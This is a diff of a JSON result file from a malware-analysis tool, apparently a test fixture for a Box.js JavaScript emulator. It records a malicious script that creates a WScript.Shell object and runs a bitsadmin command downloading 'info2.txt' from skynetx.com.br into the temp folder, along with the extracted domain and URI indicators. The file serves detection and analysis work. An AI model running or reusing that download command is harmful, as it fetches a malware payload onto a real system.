@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 531,
+    "score": 533,
     "sections": [
       {
         "auto_collapse": false,
@@ -16,7 +16,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tvar JSpsOzcR = new ActiveXObject(\"WScript.Shell\")",
+        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\n\t\tActiveXObject(WScript.Shell)\n\n\t\tvar JSpsOzcR = new ActiveXObject(\"WScript.Shell\")",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -78,6 +78,75 @@
         },
         "tags": {},
         "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "IOCs extracted by Box.js",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB"
+              ]
+            }
+          }
+        },
+        "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"skynetx.com.br\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://skynetx.com.br/info2.txt\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/info2.txt\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "skynetx.com.br"
+              ],
+              "uri": [
+                "https://skynetx.com.br/info2.txt"
+              ],
+              "uri_path": [
+                "/info2.txt"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in command lines",
         "zeroize_on_tag_safe": false
       },
       {
@@ -153,12 +222,26 @@
       {
         "name": "extracted_wscript.bat",
         "sha256": "27dce7ba391a99e1976212b8c066cdf34826bb6b361dcec6a69c74bf0e21cac1"
+      },
+      {
+        "name": "cmd_0.bat",
+        "sha256": "d061697ccdd5e68a9c649339f50c55bc4009e9b37472b650a9a4157405efd837"
       }
     ],
     "supplementary": []
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 2,
@@ -194,6 +277,13 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB"
+        }
+      ],
       "network.dynamic.domain": [
         {
           "heur_id": 13,
@@ -226,6 +316,11 @@
           "heur_id": 2,
           "signatures": [],
           "value": "skynetx.com.br"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "skynetx.com.br"
         }
       ],
       "network.static.uri": [
@@ -233,9 +328,19 @@
           "heur_id": 2,
           "signatures": [],
           "value": "https://skynetx.com.br/info2.txt"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://skynetx.com.br/info2.txt"
         }
       ],
       "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/info2.txt"
+        },
         {
           "heur_id": 2,
           "signatures": [],
